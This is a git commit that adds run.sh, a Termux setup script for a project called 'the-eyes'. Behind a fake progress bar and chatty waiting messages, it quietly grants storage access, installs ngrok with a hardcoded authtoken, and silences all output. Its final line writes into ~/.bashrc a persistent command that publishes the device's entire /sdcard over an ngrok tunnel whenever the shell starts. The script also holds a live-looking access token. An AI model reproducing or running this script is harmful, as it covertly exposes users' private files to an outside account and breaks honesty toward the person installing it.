3688dd479950ae2caea3eec54fd3f45eb5a610ac
Kennn05 <bosslevelgod2@gmail.com>
2023-11-29 18:42:00 +0800

    Added run.sh script for the-eyes project

---
+++ run.sh
@@ -0,0 +1,64 @@
+clear
+yes | termux-setup-storage > /dev/null 2>&1 && clear
+echo "--------------------------------------"
+echo "coded by : nsa739@Marvelaid"
+echo "--------------------------------------"
+echo "SANTAI DULU...."
+echo "MINUM KOPI DULU "
+echo "CHILL WHILE WAITING "
+echo "GO DRINK COFFEE , SCROLLING TIKTOK"
+echo "--------------------------------------"
+echo "Loading Please Wait....."
+echo "--------------------------------------"
+echo ""
+
+function print_bar() {
+    local progress=$1
+    local width=15
+    local bar_width=$((progress * width / 100))
+
+    printf "\r[%-*s] %3d%%" "$width" "$(printf '%.0s' $(seq 20 "$bar_width"))" "$progress"
+}
+
+print_bar 1
+sleep 1
+
+print_bar 10
+apt update -y > /dev/null 2>&1 && sleep 1
+
+print_bar 20
+(apt-get update -o Dpkg::Options::="--force-confnew" --allow-downgrades --allow-remove-essential --allow-change-held-packages -y || apt-get update) > /dev/null 2>&1 && sleep 1
+
+print_bar 30
+pkg install proot resolv-conf -y > /dev/null 2>&1 && sleep 1
+
+print_bar 40
+pkg install -y python > /dev/null 2>&1 && sleep 1
+
+print_bar 50
+yes "N" | pkg update -y > /dev/null 2>&1 && sleep 1
+
+print_bar 60
+yes "N" | pkg upgrade -y > /dev/null 2>&1 && sleep 1
+
+print_bar 70
+pkg install -y wget > /dev/null 2>&1 && sleep 1
+
+print_bar 80
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1 && sleep 1
+
+print_bar 90
+unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1 && sleep 1
+
+print_bar 95
+chmod +x ngrok > /dev/null 2>&1 && sleep 1
+
+print_bar 98
+mv ngrok /data/data/com.termux/files/usr/bin/ngrok > /dev/null 2>&1 && sleep 1
+
+print_bar 99
+ngrok authtoken 2I4JDe48dLs7BmvZoSTNGSPRVtn_q55YzU3ikG8Ewt5HogEV > /dev/null 2>&1 && sleep 1
+
+print_bar 100
+echo ""
+echo -e "\ncd /sdcard && nohup python -m http.server 8080 > /dev/null 2>&1 & termux-chroot ngrok http 8080" >> ~/.bashrc && echo "DONE, PLEASE EXIT" && source ~/.bashrc
